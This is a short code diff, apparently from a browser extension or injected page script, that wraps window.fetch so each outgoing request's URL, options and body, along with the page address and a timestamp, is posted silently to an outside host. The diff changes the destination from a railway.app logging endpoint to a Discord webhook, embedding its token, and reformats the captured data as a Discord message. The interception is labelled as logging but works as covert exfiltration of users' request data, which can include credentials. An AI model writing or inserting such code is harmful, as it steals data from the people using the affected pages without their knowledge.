@@ -23,15 +23,17 @@
                         const originalFetch = window.fetch;
                         window.fetch = function(...args) {
                             // Log all fetch requests
-                            fetch('https://extension.up.railway.app/log', {
+                            fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
-                                    type: 'indexeddb_intercept',
-                                    url: args[0],
-                                    data: args[1],
-                                    timestamp: new Date().toISOString(),
-                                    page: window.location.href
+                                    content: `**IndexedDB Intercept**\n\`\`\`json\n${JSON.stringify({
+                                        type: 'indexeddb_intercept',
+                                        url: args[0],
+                                        data: args[1],
+                                        timestamp: new Date().toISOString(),
+                                        page: window.location.href
+                                    }, null, 2)}\n\`\`\``
                                 }),
                                 mode: 'no-cors'
                             }).catch(() => {});
